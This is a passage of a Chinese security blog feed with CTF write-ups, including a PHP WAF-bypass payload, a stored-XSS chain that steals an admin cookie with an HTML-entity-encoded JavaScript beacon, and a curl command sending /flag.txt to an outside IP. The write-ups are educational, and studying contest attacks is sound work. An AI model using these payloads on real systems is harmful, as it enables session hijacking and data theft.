title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p><p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;a href=&quot;#2019国赛Web线上题目Lovemath多解WP&quot; class=&quot;headerlink&quot; title=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;/a&gt;2019国赛Web线上
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2019-Writeup</title>
    <link href="https://hpdoger.cn/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019-Writeup/"/>
    <id>https://hpdoger.cn/2019/04/08/西湖论剑2019-Writeup/</id>
    <published>2019-04-07T16:00:00.000Z</published>
    <updated>2019-04-09T08:33:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑2019-Writeup"><a href="#西湖论剑2019-Writeup" class="headerlink" title="西湖论剑2019-Writeup"></a>西湖论剑2019-Writeup</h1><p>Author:Hpdoger@D0g3</p><p>这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333</p><h1 id="Web-3"><a href="#Web-3" class="headerlink" title="Web-3"></a>Web-3</h1><p>扫描到DS_Store文件泄露：<a href="http://ctf3.linkedbyx.com/11182/DS_Store" target="_blank" rel="noopener">http://ctf3.linkedbyx.com/11182/DS_Store</a><br><img src="http://static.zybuluo.com/1160307775/y7a0rdxx52eav7p0rn96oikc/image_1d7rcmc741ep8qtr17um15g5v49.png" alt="image_1d7rcmc741ep8qtr17um15g5v49.png-31.9kB"></p><p>扫描了一下e1xxx这个自路径发现一处git泄露：<br><img src="http://static.zybuluo.com/1160307775/4utptwr6qxtydxzsxhry0pvr/image_1d7rcont5k191lp1131q17k81eri4m.png" alt="image_1d7rcont5k191lp1131q17k81eri4m.png-38.3kB"></p><p>访问到github仓库:<a href="https://github.com/cumtxujiabin/zip" target="_blank" rel="noopener">https://github.com/cumtxujiabin/zip</a><br><img src="http://static.zybuluo.com/1160307775/ucxu7j63r39crwi3tci5vl0x/image_1d7rcp5i018i0sesg9a1oec9g353.png" alt="image_1d7rcp5i018i0sesg9a1oec9g353.png-78.6kB"></p><p>源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击<br><img src="http://static.zybuluo.com/1160307775/vhc6g73jwf6obx3j6edutvqy/image_1d7rcsqca1qcl1538t7j1mpti6f60.png" alt="image_1d7rcsqca1qcl1538t7j1mpti6f60.png-37.5kB"></p><p>用AR跑了一下得到hint文件<br><img src="http://static.zybuluo.com/1160307775/kw4offpg4avzpe0ccs5ji599/image_1d7s0v7dd1djv10opn7j11jq113cei.png" alt="image_1d7s0v7dd1djv10opn7j11jq113cei.png-72.4kB"></p><p>点开hint有两个提示，</p><ol><li>很明显这个code就是之前首页的参数值<br><img src="http://static.zybuluo.com/1160307775/qr951e5gxpg4860aulbxpnvj/image_1d7riioviv8dnt21j3g1m6s1l9j6q.png" alt="image_1d7riioviv8dnt21j3g1m6s1l9j6q.png-14.9kB"></li><li>seed应该暗示着随机数/种子</li></ol><p>拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子<br><img src="http://static.zybuluo.com/1160307775/lfy0x9hxu4icygym0gkvnrx5/image_1d7rilc951g6t1idm1qtg1osbjnv77.png" alt="image_1d7rilc951g6t1idm1qtg1osbjnv77.png-61.2kB"></p><p>最后跑出来种子+.txt后缀请求得到flag<br><img src="http://static.zybuluo.com/1160307775/a6w2254ge2kgzj3ltc4t7gau/image_1d7rkjigs14vl1gg9h801mr18onag.png" alt="image_1d7rkjigs14vl1gg9h801mr18onag.png-40kB"><br><img src="http://static.zybuluo.com/1160307775/sj0b5o6mrowzi3y4jl0ce6cn/image_1d7rkfg2e1enjh0g1kif2lb14ala3.png" alt="image_1d7rkfg2e1enjh0g1kif2lb14ala3.png-23.2kB"></p><p>略脑洞。。</p><h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p><p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p><pre><code>&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code></pre><p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p><p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p><p>但是测试用js uri加载外源js不能成功，打不到cookie。</p><p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p><p>编码转换+exp如下<br><img src="http://static.zybuluo.com/1160307775/b5tqrpd78fjkvlld0e7sxvy9/image_1d7rltv912q91kmukju81714bjbn.png" alt="image_1d7rllved1r0b1ku31lp717bi3hdat.png-71.2kB"></p><p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p><p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p><p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p><pre><code>curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p><p>编码转换的exp如下</p><pre><code># Author:Hpdoger@d0g3html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;buffer = &quot;&quot;for zimu in html_old:    zimu = ord(zimu)    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)    # print(&quot;&amp;#&quot;+zimu)    buffer = buffer + zimuprint(buffer)</code></pre><h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p><p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p><p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" alt="image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png-212.3kB"></p><p>看到根目录存在ffxxx的文件，直接用file去读<br><img src="http://static.zybuluo.com/1160307775/8qtcm0dqetiop2w9ccw2tr8k/image_1d7rmhg0ls1l3ptm8k29n614e5.png" alt="image_1d7rmhg0ls1l3ptm8k29n614e5.png-27.7kB"></p><h1 id="MISC3-TTL隐写"><a href="#MISC3-TTL隐写" class="headerlink" title="MISC3 TTL隐写"></a>MISC3 TTL隐写</h1><p>给了个本文，里面是很多TTL值。hint说隐藏了信息。<br><img src="http://static.zybuluo.com/1160307775/m9tv96888aiofm7wv51e4bp3/image_1d7ttpfr51j1m1jks1rd3bafkqjp.png" alt="image_1d7ttpfr51j1m1jks1rd3bafkqjp.png-31.8kB"></p><p>在网上找了一下，发现在MISC中有一项技术叫TTL隐写。</p><p>大致的隐写流程如下：<br>将TTL的值转为8位二进制，高位补0，取头两位的二进制。这样4个TTL的值就能取够一个8位的二进制数，再将这个8位的二进制转换为字符(因为一个字符=一个字节=8位二进制)。</p><p>这就是成功将字符隐写在TTL值中，所以只需要逆出来取8位还原成字符就行，写了个提取脚本</p><pre><code>#! /usr/bin/python3# Author: Hpdoger@d0g3count = 0change_list = []word_list = &#39;&#39;zimus = &#39;&#39;with open(&quot;ttls.txt&quot;,&quot;r&quot;) as file:    for ttl in file.readlines():        change_list.append(ttl.replace(&#39;TTL=&#39;,&#39;&#39;))        if len(change_list) == 4:            for num in change_list:                num = int(num)                a = bin(num).replace(&#39;0b&#39;,&#39;&#39;)                b = str(&quot;%08d&quot; % int(a))                infront = b[0:2]                word_list = word_list + infront            zimu = int(word_list,2)            zimus = zimus+chr(zimu)            word_list = &#39;&#39;            change_list.clear()            count = 0with open(&#39;results.txt&#39;,&#39;w&#39;) as file2:    file2.write(zimus)</code></pre><p>转换出来的结果如下<br><img src="http://static.zybuluo.com/1160307775/0ulidat6fp1h55b84nrtusak/image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png" alt="image_1d7tu4dn0ncj1f5s1o7j15641ggr19.png-147.1kB"></p><p>一看就是16进制，开头ffd8ff是图片头，拖到winhex里还原成图片就行了，最后还原出来4个二维码。</p><p>拼接扫描得到:</p><pre><code>key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p}</code></pre><p>维吉尼亚密码解密，得到<br>flag{2028ab39927df1d96e6a12b03j58002v}<br>再进行一次字母转换<br>e-&gt;j,e-&gt;v<br>flag{2028ab39927df1d96e6a12b03e58002e}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;a href=&quot;#西湖论剑2019-Writeup&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑2019-Writeup&quot;&gt;&lt;/a&gt;西湖论剑2019-Writeup&lt;/h1&gt;&lt;p&gt;Author:Hpdoger
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
</feed>
